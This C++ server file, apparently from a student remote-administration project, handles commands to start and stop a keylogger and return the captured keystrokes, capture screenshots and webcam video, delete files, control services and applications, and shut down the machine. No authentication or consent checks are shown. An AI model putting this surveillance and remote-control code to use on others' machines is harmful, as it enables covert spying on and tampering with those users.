#include "Server.h"
#include "App.h"
#include "KeyLogger.h"
#include "File.h"
#include "Service.h"
#include "Webcam.h"
#include "Screenshot.h"

bool Server::keylog(Request& request, Response &response) {
    static KeyLogger keylog;

    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    
    if (subaction == "Start") {
        cout << "Started keylogger\n";
        keylog.startKeylogger(); 
    } else if (subaction == "Stop") {
        cout << "Stopped keylogger\n";
        keylog.stopKeylogger();

        std::ifstream fin = keylog.getLoggingStream();
        std::string content; 
        std::string buf;
        while (getline(fin, buf)) {
            content += buf + "\n"; 
        }
        fin.close();
    
        response.putParam(kBody, content);

        // Gui file TODO DELETE
        // fin = std::ifstream("tmt.txt", fstream::binary);
        response.putParam(kFilePrefix + "tmt.txt", "");
    }  

    return true;
}

bool Server::handleShutdownSystem(Request& request, Response &response){
    App app;
    app.shutdownSystem();
    response.putParam(kStatus, "Shutdown initiated");
    return true;
}
bool Server::handleRestartSystem(Request& request, Response &response){
    App app;
    app.restartSystem();
    response.putParam(kStatus, "Restart initiated");
    return true;
}

bool Server::listRunningApps(Request& request, Response &response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();
    std::string appList_str = "Running Application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i] + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::closeApp(Request& request, Response& response){
    App app;
    std::vector<std::string> appList = app.getRunningTaskbarApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appName = appList[appIndex - 1];
    bool success = app.closeApplication(appName);
    response.putParam(kStatus, success ? "Closed" : "Failed to close");
    return true;
}

bool Server::listInstalledApps(Request& request, Response& response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();
    std::string appList_str = "Installed application: \n";
    for (int i = 0; i < appList.size(); i++){
        appList_str += std::to_string(i + 1) + ". " + appList[i].name + "\n";
    }
    response.putParam(kBody, appList_str);
    return true;
}

bool Server::runApp(Request& request, Response &response){
    App app;
    std::vector<AppInfo> appList = app.getInstalledApps();

    int appIndex = std::stoi(request.getParam("AppIndex"));
    if (appIndex <= 0 || appIndex > appList.size()){
        response.putParam(kStatus, "Invalid index");
        return false;
    }
    std::string appPath = appList[appIndex - 1].fullpath;
    bool success = app.runApplication(appPath);
    response.putParam(kBody, success ? "App is running" : "Failed to run");
    return true;
}

bool Server::handleApp(Request& request, Response& response){
    std::string subAction = request.getParam(kSubAction);
    if (subAction == "listrunningapps")
        return listRunningApps(request, response);
    else if (subAction == "closeapp")
        return closeApp(request, response);
    else if (subAction == "listinstalledapps")
        return listInstalledApps(request, response);
    else if (subAction == "runapp")
        return runApp(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
}

bool Server::handleStatus(Request& request, Response& response){
    std::string subAction = request.getParam(kSubAction);
    if (subAction == "shutdown")
        return handleShutdownSystem(request, response);
    else if (subAction == "restart")
        return handleRestartSystem(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
}

// Thang : File & Service
// ---Start---
bool Server::handleGetFile(Request& request, Response& response){
    File file;
    string file_path = request.getParam("Path");
    string file_list = file.getFiles(file_path);
    response.putParam(kBody, file_list);
    return true;

}

bool Server::handleDeleteFile(Request& request, Response& response){
    File file;
    std::string file_path = request.getParam("Path");
    file.deleteFile(file_path);
    response.putParam(kBody, "Deleted File");
    return true;
}

bool Server::handleFile(Request& request, Response& response){
    string subAction = request.getParam(kSubAction);
    if (subAction == "listfile")
        return handleGetFile(request, response);
    else if (subAction == "deletefile")
        return handleDeleteFile(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
    return true;
}


bool Server::listRunningService(Request& request, Response& response){
    Service service;
    std::string list_service = service.listRunningServices();
    response.putParam(kBody, list_service);
    return true;
}

bool Server::startService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam("Name");
    bool success = service.StartServiceByName(name_service);
    response.putParam(kBody, success ? "Start service success" : "Failed to run");
    return true;
}

bool Server::stopService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam("Name");
    bool success = service.StopServiceByName(name_service);
    response.putParam(kBody, success ? "Stop service success" : "Failed to stop");
    return true;
}

bool Server::handleService(Request& request, Response& response){
    string subAction = request.getParam(kSubAction);
    if (subAction == "listservice")
        return listRunningService(request, response);
    else if (subAction == "startservice")
        return startService(request, response);
    else if (subAction == "stopservice")
        return stopService(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
    return true;
}


// ---End--- (File & Service)

// CheckSum and Save Response

// Hàm tính checksum của một file sử dụng SHA256
std::string calculateSHA256Checksum(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary); // Mở file ở chế độ nhị phân
    if (!file) {
        throw std::runtime_error("Could not open file for checksum calculation.");
    }

    SHA256 sha256; // Tạo một instance của SHA256
    std::string buffer;
    char chunk[1024]; // Đọc file theo khối 1024 byte để tiết kiệm bộ nhớ
    while (file.read(chunk, sizeof(chunk))) {
        sha256.update(reinterpret_cast<const uint8_t*>(chunk), file.gcount());
    }
    sha256.update(reinterpret_cast<const uint8_t*>(chunk), file.gcount()); // Xử lý phần còn lại
    file.close();

    // Trả về checksum dưới dạng chuỗi hex
    return SHA256::toString(sha256.digest());
}

// Hàm xử lý checksum cho response
bool Server::validateChecksum(Request& request, Response& response) {
    try {
        // Lấy checksum gửi từ client
        std::string receivedChecksum = request.getParam("Checksum");
        // Lấy đường dẫn file từ param (cần xử lý trước)
        std::string fileName = request.getParam(kFilePrefix + "filename");

        // Tính checksum của file
        std::string calculatedChecksum = calculateSHA256Checksum(fileName);

        // So sánh checksum nhận và tính được
        if (calculatedChecksum == receivedChecksum) {
            response.putParam(kStatus, "Ok");
        } else {
            response.putParam(kStatus, "Error");
            response.putParam(kBody, "Checksum mismatch.");
        }
    } catch (const std::exception& e) {
        // Xử lý ngoại lệ nếu xảy ra lỗi
        response.putParam(kStatus, "Error");
        response.putParam(kBody, e.what());
        return false;
    }
    return true;
}

// Hàm lưu response tạm trước khi gửi
void Server::saveTempResponse(const std::string& responseData) {
    std::ofstream tempFile("temp_response.txt", std::ios::app);  // Mở file ở chế độ append
    if (!tempFile) {
        throw std::runtime_error("Could not create temporary response file.");
    }
    tempFile << responseData << "\n";  // Lưu dữ liệu response vào file
    tempFile.close();
}

// Hàm tải lại phản hồi tạm từ file
std::string Server::loadTempResponse() {
    std::ifstream tempFile("temp_response.txt");
    if (!tempFile) {
        return ""; // Nếu không tìm thấy file tạm, trả về chuỗi rỗng
    }
    std::ostringstream buffer;
    buffer << tempFile.rdbuf();  // Đọc toàn bộ nội dung file
    tempFile.close();
    return buffer.str();
}

// Hàm xóa toàn bộ nội dung file tạm
void Server::clearTempResponse() {
    std::ofstream tempFile("temp_response.txt", std::ios::trunc);  // Mở file với chế độ 'trunc' để xóa hết dữ liệu
    if (!tempFile) {
        throw std::runtime_error("Could not open temporary response file for clearing.");
    }
    tempFile.close();  // File sẽ bị xóa nội dung khi đóng lại
}

// Hàm xử lý tiếp tục gửi phản hồi nếu server bị tắt đột ngột
bool Server::processRequestWithResumption(Request& request, Response& response) {
    std::string resume = request.getParam("Resume");  // Kiểm tra yêu cầu tiếp tục từ client

    if (!resume.empty()) {
        // Nếu client yêu cầu tiếp tục, tải lại và gửi lại phản hồi
        std::string tempData = loadTempResponse();
        if (!tempData.empty()) {
            response.setParams({{"Body", tempData}});
            response.putParam(kStatus, "Resumed");

            // Sau khi gửi dữ liệu, xóa nội dung file tạm
            clearTempResponse();
            return true;
        }
        response.putParam(kStatus, "Error");
        response.putParam(kBody, "No previous response found.");
        return false;
    }

    // Xử lý bình thường
    std::string responseData = "This is the response data.";  // Ví dụ phản hồi
    saveTempResponse(responseData);  // Lưu phản hồi tạm vào file
    response.setParams({{"Body", responseData}});
    response.putParam(kStatus, "Ok");

    return true;
}

// ---------------------

bool Server::processRequest(Request& request, Response &response) {
    cout << "Processing Request\n" << request << "\n";
    response.setAction(request.getAction());
    response.setParams(request.getParams());

    // TODO param order
    
    switch (request.getAction()) {
        case ACTION_KEYLOG:
            return keylog(request, response);
        case ACTION_SHUTDOWN:
            return handleStatus(request, response);
        case ACTION_APP:
            return handleApp(request, response);
        case ACTION_SERVICES:
            return handleService(request, response);
        case ACTION_FILE:
            return handleFile(request, response);
        default:
            return false;
    }
}

//Duc
bool Server::screenshot(Request& request, Response &response){
    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    Screenshot screenshot;

    if (subaction == "Screenshot") {
        std::cout << "Started screenshot!\n";
        screenshot.screenshot();
    }
    response.putParam(kFilePrefix + "screencapture.bmp", "");
    return true;
}

bool Server::getVideoByWebcam(Request& request, Response &response) {
    Webcam webcam;
    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");

    if (subaction == "Start") {
        const string filename = "../build/files/videowebcam.mp4";
        bool result = webcam.StartWebcamRecording(filename);
        if (!result) {
            response.putParam(kStatus, "Error: Failed to start recording.");
        }
    }
    else if (subaction == "Stop") {
        bool result = webcam.StopWebcamRecording();  // Dừng quay
        if (!result) {
            response.putParam(kStatus, "Error: Failed to stop recording.");
        }
    }
    response.putParam(kFilePrefix + "videowebcam.mp4", "");
    return true;
}
